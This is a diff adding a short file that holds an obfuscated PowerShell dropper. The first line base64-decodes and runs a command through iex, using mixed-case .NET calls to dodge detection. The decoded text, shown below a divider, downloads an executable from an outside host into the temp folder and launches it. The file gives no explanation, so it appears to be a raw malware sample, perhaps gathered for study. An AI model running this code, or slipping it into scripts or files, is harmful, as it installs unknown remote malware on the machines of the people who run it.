@@ -1,0 +1,7 @@
+iex([SyStEm.tExt.ENCodINg]::UTf8.gETsTRIng([SysTem.coNVert]::fROMBasE64StRINg('CihOZXctT2JqZWN0IHN5c1RFbS5ORVQud0ViY2xpZW5UKS5kb3duTE9BRGZpbGUoJ2h0dHA6Ly9sYWJpZC5jb20ubXkvbS9tMS5leGUnLCIkRU5WOlRFTVBcbTEuZXhlIik7U3RhcnQtUHJvY2VzcyAoIiRFTlY6VEVNUFxtMS5leGUiKQoK')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object sysTEm.NET.wEbclienT).downLOADfile('http://labid.com.my/m/m1.exe',"$ENV:TEMP\m1.exe");Start-Process ("$ENV:TEMP\m1.exe")
+
